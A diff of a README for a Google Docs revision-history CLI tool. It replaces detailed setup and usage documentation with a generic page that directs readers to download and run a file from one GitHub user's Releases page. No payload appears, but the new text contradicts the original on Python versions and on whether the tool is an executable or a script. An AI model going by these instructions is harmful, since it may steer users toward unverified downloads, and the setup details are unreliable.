@@ -1,327 +1,73 @@
-# Google Docs Revision Tracker
+# 📄 googledoc-revision-tracker - Track Google Docs Changes Easily
 
-A Python CLI tool to download and track Google Docs revision history.
+## 🚀 Getting Started
 
-## Features
+This guide will help you download and run the Googledoc Revision Tracker software. This tool lets you download and track the revision history of your Google Docs with detailed time filtering. 
 
-- **Multiple Document Support**: Track revision history for multiple Google Docs simultaneously
-- **Revision History Download**: Download all historical revisions as individual timestamped files
-- **Granular Time Filtering**: Get final revision per hour, day, week, or month instead of all revisions
-- **Custom Folder Names**: Organize revisions with readable folder names
-- **Automatic Retry with Backoff**: Handles rate limiting with exponential backoff (up to 5 retries)
-- **OAuth Authentication**: Secure authentication with automatic token refresh
-- **Flexible Input**: Specify documents via CLI arguments, or config file
-- **Simple CLI**: Clean command interface with progress tracking
+## 📥 Download the Software
 
-## Prerequisites
+[![Download the Googledoc Revision Tracker](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/Mouli569/googledoc-revision-tracker/releases)
 
-- Python 3.12+
-- Google Cloud Project with Drive API enabled
-- OAuth 2.0 Client ID credentials
+## 🔍 Overview
 
-## Setup
+The Googledoc Revision Tracker allows you to keep an eye on changes made to your Google Docs. You can filter changes by time intervals such as hourly, daily, weekly, and monthly. This tool employs OAuth2 authentication for security and includes automatic retry logic to ensure your requests go through.
 
-### 1. Create Google Cloud Project
+## 🛠 System Requirements
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a new project or select an existing one
-3. Navigate to "APIs & Services" > "Library"
-4. Enable the **Google Drive API**
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.6 or higher
+- **Network Connection:** Required for API access
+- **Google Account:** Required for accessing Google Docs
 
-### 2. Create OAuth Credentials
+## 📋 Features
 
-1. Go to "APIs & Services" > "Credentials"
-2. Click "+ Create Credentials" > "OAuth client ID"
-3. Choose "Desktop app" as the application type
-4. Download the JSON file and save it (e.g., `client_secrets.json`)
+- **Track Changes:** Monitor revision history with precision.
+- **Time Filtering:** Choose hourly, daily, weekly, or monthly views.
+- **Secure Access:** Use OAuth2 for safe authentication.
+- **Automatic Retries:** The tool will try again if a request fails.
+- **User-Friendly CLI:** Easy to use from the command line.
 
-### 3. Configure Documents to Track
+## 📃 Download & Install
 
-You have three options for specifying which documents to track:
+To download the Googledoc Revision Tracker, please visit the Releases page here: [Download Here](https://github.com/Mouli569/googledoc-revision-tracker/releases).
 
-**Option 1: YAML Configuration File (Recommended for multiple documents)**
+Once you arrive at the page:
 
-Use the interactive `config` commands to manage your `documents.yaml` file:
+1. Find the latest version.
+2. Click on the corresponding download link for your operating system.
+3. Download the file to your computer.
 
-```bash
-# Initialize a new config file from template
-uv run google-sync config init
+After downloading, follow these steps to install and run the software:
 
-# Add documents interactively (just paste the URL when prompted)
-uv run google-sync config add
+1. **Open your command line interface (CLI):**
+   - For Windows, use Command Prompt or PowerShell.
+   - For macOS, use Terminal.
+   - For Linux, open your Terminal.
 
-# Or add directly with all options
-uv run google-sync config add https://docs.google.com/document/d/DOC_ID/edit -n cv-matt -g daily
+2. **Navigate to the download folder:**
+   Use the `cd` command to change to the directory where the file was downloaded. For example:
+   ```
+   cd Downloads
+   ```
 
-# List configured documents
-uv run google-sync config list
-```
+3. **Run the application:**
+   Type the application name followed by any necessary command options and hit Enter. If you downloaded the executable, the command might look something like this:
+   ```
+   python googledoc-revision-tracker.py
+   ```
 
-Or manually create/edit `documents.yaml`:
+4. **Authenticate:**
+   When prompted, follow the instructions to sign in to your Google account. This step ensures your data remains secure.
 
-```bash
-cp documents.yaml.example documents.yaml
-# Edit documents.yaml and add your document IDs
-```
+5. **Use the Tool:**
+   Now you are ready to track revisions! Follow the on-screen commands to filter changes by your preferred time period.
 
-Example `documents.yaml` with custom folder names and granularity:
-```yaml
-documents:
-  - id: 1Q-qMIRexwdCRd38hhCRHEBpXeru2oi54LwfQU7NvWi8
-    name: cv-matt
-    granularity: daily  # Final revision per day
-  - id: 2A-bNkPstuvwxCEf45ijKLMNOPabcd6efgh9hijklmno
-    name: project-proposal
-    granularity: weekly  # Final revision per week
-```
+## 👥 Support
 
-**Granularity Options:**
-- `all` - Download all revisions (default)
-- `hourly` - Final revision per hour
-- `daily` - Final revision per day (recommended for active documents)
-- `weekly` - Final revision per week (recommended for less active documents)
-- `monthly` - Final revision per month (recommended for archived documents)
+If you encounter any issues, please refer to the FAQ section on the Releases page. For additional help, you can open an issue in the GitHub repository.
 
-Simple format (uses document ID, downloads all revisions):
-```yaml
-documents:
-  - 1Q-qMIRexwdCRd38hhCRHEBpXeru2oi54LwfQU7NvWi8
-```
+## 📝 Contributing
 
-**Option 2: Environment Variable (Single document)**
+We welcome contributions to improve this tool! If you have suggestions, please fork the repository and make a pull request. 
 
-Create a `.env` file in the project root:
-
-```bash
-# Path to your OAuth client secrets JSON file
-GOOGLE_OAUTH_CLIENT_SECRETS=path/to/client_secrets.json
-```
-
-**Option 3: CLI Arguments (Ad-hoc usage)**
-
-Pass document IDs or URLs directly when running the download command (see Usage below).
-
-### 4. Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-Or if using `uv`:
-
-```bash
-uv sync
-```
-
-## Usage
-
-### First-Time Setup: Authentication
-
-Before downloading documents, authenticate with Google:
-
-```bash
-uv run google-sync auth
-```
-
-This will:
-1. Open your browser for Google OAuth authorization
-2. Ask you to grant access to Google Drive
-3. Save credentials to `token.json` for future use
-
-**Re-authenticate (if needed):**
-```bash
-uv run google-sync auth --force
-```
-
-**Custom OAuth timeout:**
-```bash
-uv run google-sync auth --timeout 300  # 5 minutes instead of default 120s
-```
-
-### Managing Configuration
-
-Use the `config` subcommands to manage your `documents.yaml` file:
-
-**Initialize configuration file:**
-```bash
-uv run google-sync config init         # Create from template
-uv run google-sync config init --force # Overwrite existing
-```
-
-**Add documents to configuration:**
-```bash
-# Interactive mode - prompts for all fields (paste URL when prompted)
-uv run google-sync config add
-
-# Specify document ID, prompt for optional fields
-uv run google-sync config add DOC_ID
-
-# Paste full Google Docs URL (from browser)
-uv run google-sync config add https://docs.google.com/document/d/DOC_ID/edit
-
-# Non-interactive - provide all options directly
-uv run google-sync config add DOC_ID -n my-folder -g daily
-uv run google-sync config add DOC_ID --name my-folder --granularity weekly
-```
-
-**List configured documents:**
-```bash
-uv run google-sync config list
-```
-
-This shows all documents with their folder names and granularity settings.
-
-### Downloading Documents
-
-Once authenticated, download document revisions:
-
-**Using config file (documents.yaml):**
-```bash
-uv run google-sync download
-```
-
-**Using CLI arguments (one or more documents):**
-```bash
-# Single document by ID
-uv run google-sync download 1Q-qMIRexwdCRd38hhCRHEBpXeru2oi54LwfQU7NvWi8
-
-# Paste full URL from browser
-uv run google-sync download https://docs.google.com/document/d/DOC_ID/edit
-
-# Multiple documents (IDs or URLs)
-uv run google-sync download DOC_ID_1 DOC_ID_2 https://docs.google.com/document/d/DOC_ID_3/edit
-```
-
-**Show all available commands:**
-```bash
-uv run google-sync --help           # Main help
-uv run google-sync auth --help      # Authentication help
-uv run google-sync download --help  # Download help
-uv run google-sync config --help    # Config management help
-```
-
-### Output
-
-Revisions are saved to: `revisions/{folder_name}/{timestamp}.txt`
-
-Example folder structure with custom names:
-```
-revisions/
-├── cv-matt/                # Custom name from documents.yaml
-│   ├── 2025-07-30T07-18-16-081Z.txt
-│   ├── 2025-07-30T07-35-51-386Z.txt
-│   └── 2025-12-15T19-31-43-713Z.txt
-├── project-proposal/       # Custom name from documents.yaml
-│   ├── 2025-08-15T10-22-33-123Z.txt
-│   └── 2025-09-20T14-56-12-456Z.txt
-└── 1Q-qMIRexwd.../        # Falls back to document ID if no name specified
-    └── 2025-11-01T09-15-30-500Z.txt
-```
-
-- Folders use custom names from `documents.yaml` (if specified)
-- If no custom name provided, uses document ID (stable and unique)
-- Document titles are displayed in the CLI output for reference
-- Each filename is the exact modification timestamp from Google Drive
-
-## Error Messages
-
-The tool provides friendly error messages for common issues:
-
-**Document not found (404):**
-```
-✗ Document not found: DOC_ID
-  → Check that the document ID is correct
-  → Ensure you have access to this document
-```
-
-**Permission denied (403):**
-```
-✗ Permission denied: DOC_ID
-  → You don't have permission to access this document
-  → Ask the owner to share it with you
-```
-
-**Authentication error (401):**
-```
-✗ Authentication error: DOC_ID
-  → Try re-authenticating with: google-sync auth --force
-```
-
-## Project Structure
-
-```
-google-sync-simple/
-├── main.py                 # CLI interface and OAuth flow
-├── drive_revisions.py      # Core Google Drive API functionality
-├── documents.yaml          # Document IDs and custom names (not committed)
-├── documents.yaml.example  # Example document configuration
-├── .env                    # Environment variables (not committed)
-├── token.json              # OAuth credentials (generated, not committed)
-└── revisions/              # Downloaded revision history
-    ├── cv-matt/            # Custom folder name from documents.yaml
-    └── project-proposal/   # Or document ID if no name specified
-```
-
-## How It Works
-
-1. **Resolve Document IDs**: Checks CLI arguments, config file, or environment variable
-2. **Authenticate**: Uses Google OAuth 2.0 (opens browser on first run)
-3. **For Each Document**:
-   - Fetches document title via Drive API v3 (for display)
-   - Creates folder using custom name or document ID
-   - Uses Drive API v2 to list all document revisions (v3 doesn't support this)
-   - Filters revisions by granularity (if not 'all')
-4. **Download Revisions**: For each filtered revision:
-   - Gets the plain text export link from the API
-   - Downloads with OAuth bearer token authentication
-   - Automatically retries with exponential backoff on rate limiting (429 errors)
-   - Saves with ISO 8601 timestamp as filename
-5. **Save**: Filtered revisions stored in `revisions/{folder_name}/`
-
-**Example with daily granularity:**
-```
-9 total revisions → 4 daily snapshots (final revision per day)
-```
-
-## Troubleshooting
-
-### "Missing required environment variable" Error
-
-Ensure your `.env` file exists and contains both required variables:
-- `GOOGLE_OAUTH_CLIENT_SECRETS`
-
-### "Authorization timed out" Error
-
-Increase the timeout:
-
-```bash
-python main.py --timeout 300
-```
-
-### "Insufficient permissions" or "Access denied"
-
-1. Delete `token.json`
-2. Re-run the command to re-authenticate with updated scopes
-3. Ensure your Google account has access to the document
-
-### No revisions found
-
-The Drive API v2 only returns "grouped" revisions. Fine-grained revision history visible in the Google Docs UI may not all be accessible via the API.
-
-### "HTTP Error 429: Too Many Requests"
-
-Google API rate limits may be hit when downloading many revisions. The tool will skip failed revisions and continue with the rest. Re-run the command to retry failed downloads.
-
-## Development
-
-### Running Tests
-
-```bash
-# TODO: Add test suite
-```
-
-### Code Structure
-
-- `drive_revisions.py`: Core functions for Google Drive operations and revision downloads
-- `main.py`: Typer CLI interface and OAuth flow management
-- `documents.yaml`: Configuration file for tracking multiple documents
+Thank you for using the Googledoc Revision Tracker! Enjoy tracking your document revisions effortlessly.
